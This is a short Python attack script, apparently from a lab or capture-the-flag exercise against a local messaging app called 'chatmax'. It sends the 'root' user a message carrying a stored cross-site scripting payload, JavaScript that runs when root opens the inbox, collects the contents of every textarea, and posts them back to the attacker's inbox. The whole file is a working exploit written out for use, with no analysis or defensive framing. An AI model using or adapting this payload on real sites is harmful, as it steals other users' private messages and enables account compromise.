
import requests
import time

def scramble(s):
    return '-'.join(str(ord(c)) for c in s)

# Login as inhibitor and send malicious message to root
username = "inhibitor"
password = "123456"

# The malicious payload - JavaScript that will execute when root opens inbox
# It reads root's messages and sends them back to inhibitor
payload = '''<script>
setTimeout(function(){
var msgs = document.querySelectorAll('textarea');
var data = '';
for(var i=0; i<msgs.length; i++){
  data += msgs[i].value + '|||';
}
var xhr = new XMLHttpRequest();
var url = '/$' + Math.random().toString().replace('.','') + 
  '?pw=' + chatmax.scramble('123456') + 
  '&un=' + chatmax.scramble('inhibitor') + 
  '&msg=' + chatmax.scramble('STOLEN:' + data) + 
  '&to=' + chatmax.scramble('inhibitor') + '.inbox';
xhr.open('GET', url);
xhr.send();
}, 2000);
</script>'''

# Send message to root
import random
rand = str(random.random()).replace('.', '')

# Craft the message
msg = '{"from":"' + username + '","subject":"Important","date":"now","body":"' + payload.replace('"', '\\"') + '"}'
msg += '//END_MSG//'

# Pad to 16 bytes
pad_len = 16 - (len(msg) % 16)
if pad_len > 0 and pad_len != 16:
    msg += '\x00' * pad_len

url = f"http://localhost:8080/${rand}?pw={scramble(password)}&un={scramble(username)}&msg={scramble(msg)}&to={scramble('root')}.inbox"

print(f"Sending malicious message to root...")
try:
    resp = requests.get(url, timeout=5)
    if "Msg Sent" in resp.text:
        print("Message sent successfully!")
    else:
        print(f"Response: {resp.text}")
except Exception as e:
    print(f"Error: {e}")
